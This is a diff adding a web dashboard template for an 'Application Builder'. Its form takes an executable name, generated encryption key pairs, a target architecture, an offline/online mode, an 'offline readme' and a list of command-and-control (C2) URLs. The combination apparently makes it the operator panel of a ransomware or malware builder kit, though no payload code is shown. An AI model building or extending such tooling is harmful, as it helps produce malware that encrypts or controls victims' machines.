@@ -1,0 +1,130 @@
+{% extends "dashboard/base.html" %}
+
+{% block title %}
+    Builder
+{% endblock %}
+
+{% block stylesheets %}
+    <link rel="stylesheet" href="{{ url_for('static', filename='databases.css') }}">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        textarea {
+            width: 100%;
+            height: 300px;
+        }
+    </style>
+{% endblock %}
+
+{% block content %}
+    <h1 class="my-4">Application Builder</h1>
+    <br>
+    <ul class="nav nav-tabs" id="myTabs" role="tablist">
+        <li class="nav-item">
+            <a class="nav-link active" id="builder-tab" data-toggle="tab" href="#builder" role="tab"
+               aria-controls="builder"
+               aria-selected="true">Builder</a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" id="builds-tab" data-toggle="tab" href="#builds" role="tab"
+               aria-controls="builds" aria-selected="false">Builds</a>
+        </li>
+    </ul>
+    <div class="tab-content" id="myTabContent">
+        <div class="tab-pane fade show active" id="builder" role="tabpanel" aria-labelledby="builder-tab">
+            <form action="/your_submit_endpoint" method="post">
+
+                <!-- Executable Name -->
+                <div class="form-group">
+                    <label for="executable_name">Executable Name:</label>
+                    <input type="text" class="form-control" id="executable_name" name="executable_name" required>
+                </div>
+
+                <!-- Create keys button -->
+                <button type="button" class="btn btn-primary" id="generate_keys">Create keys</button>
+
+                <!-- Hidden Text Areas for Keys -->
+                <div class="form-group mt-3 d-none" id="private_key_area">
+                    <label for="private_key">Private Key:</label>
+                    <textarea class="form-control" id="private_key" name="private_key" readonly rows="3"></textarea>
+                </div>
+
+                <div class="form-group d-none" id="public_key_area">
+                    <label for="public_key">Public Key:</label>
+                    <textarea class="form-control" id="public_key" name="public_key" readonly rows="3"></textarea>
+                </div>
+
+                <br><br>
+                <div class="form-group">
+                    <label>Target architecture:</label>
+                    <div class="custom-control custom-radio">
+                        <input type="radio" id="arch32" name="architecture" value="32bit" class="custom-control-input"
+                               required>
+                        <label class="custom-control-label" for="arch32">32 bit</label>
+                    </div>
+                    <div class="custom-control custom-radio">
+                        <input type="radio" id="arch64" name="architecture" value="64bit" class="custom-control-input"
+                               required>
+                        <label class="custom-control-label" for="arch64">64 bit</label>
+                    </div>
+                </div>
+
+                <!-- Radio buttons for Preference -->
+                <div class="form-group">
+                    <label>Operation preference:</label>
+                    <div class="custom-control custom-radio">
+                        <input type="radio" id="offline" name="preference" value="offline" class="custom-control-input"
+                               required>
+                        <label class="custom-control-label" for="offline">Offline</label>
+                    </div>
+                    <div class="custom-control custom-radio">
+                        <input type="radio" id="online" name="preference" value="online" class="custom-control-input"
+                               required>
+                        <label class="custom-control-label" for="online">Online</label>
+                    </div>
+                </div>
+
+                <!-- Textarea for README -->
+                <div class="form-group">
+                    <label for="readme">Offline readme:</label>
+                    <textarea class="form-control" id="readme" name="readme"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label for="url_list">Enter C2 URLs (one per line):</label>
+                    <textarea class="form-control" id="url_list" name="url_list" rows="5"></textarea>
+                </div>
+
+
+                <!-- Build Button -->
+                <button type="submit" class="btn btn-success">Build</button>
+            </form>
+        </div>
+
+        <div class="tab-pane fade" id="builds" role="tabpanel" aria-labelledby="builds-tab">
+
+        </div>
+    </div>
+
+
+{% endblock %}
+
+{% block scripts %}
+    <script>
+        let keys = {{ keys|tojson|safe }};
+
+        $('#generate_keys').on('click', function () {
+            // Populate the text areas and show them
+            $('#private_key').val(keys[0]);
+            $('#private_key_area').removeClass('d-none');
+
+            $('#public_key').val(keys[1]);
+            $('#public_key_area').removeClass('d-none');
+        });
+    </script>
+{% endblock %}
+
